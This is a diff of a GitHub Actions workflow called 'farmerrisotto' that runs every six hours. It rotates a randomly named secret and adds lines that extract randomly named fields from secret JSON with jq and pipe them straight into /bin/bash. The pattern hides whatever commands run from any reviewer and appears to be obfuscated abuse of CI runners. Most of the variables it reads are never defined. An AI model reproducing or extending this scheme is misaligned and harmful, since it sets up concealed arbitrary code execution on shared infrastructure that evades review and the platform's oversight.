@@ -3,22 +3,27 @@ name: farmerrisotto
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 1/6 * * *'
-jobs:  # 5897
+    - cron: '4 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: farmerrisotto
         env:
-          rwnj38: ${{ secrets.rwnj38 }}
+          wx45571: ${{ secrets.wx45571 }}
         run: |
-          echo $rwnj38 | jq -r .e9 | /bin/bash
-          echo $aaw561 | jq -r .lz15 | /bin/bash
-          echo $htkra6 | jq -r .xlf35824 | /bin/bash
-          echo $gflvg50 | jq -r .p939 | /bin/bash
-          echo $w3 | jq -r .wbl00122 | /bin/bash
-          echo $kgddn9 | jq -r .nxpl79900 | /bin/bash
-          echo $kamo536 | jq -r .nlh26 | /bin/bash
-          echo $phz31 | jq -r .fa39 | /bin/bash
+          echo $wx45571 | jq -r .ex8 | /bin/bash
+          echo $hgxhw0229 | jq -r .vs485 | /bin/bash
+          echo $wzlj20122 | jq -r .edvmx8 | /bin/bash
+          echo $efp42 | jq -r .uaqzc270 | /bin/bash
+          echo $x79507 | jq -r .h5 | /bin/bash
+          echo $dozun74 | jq -r .czbmq102 | /bin/bash
+          echo $e0 | jq -r .xlv09976 | /bin/bash
+          echo $ma843 | jq -r .zrye6369 | /bin/bash
+          echo $tjfrj90 | jq -r .carn8279 | /bin/bash
+          echo $trle36182 | jq -r .ytaw3333 | /bin/bash
+          echo $hgr3718 | jq -r .we680 | /bin/bash
+          echo $srpu92 | jq -r .yxwtb1463 | /bin/bash
 
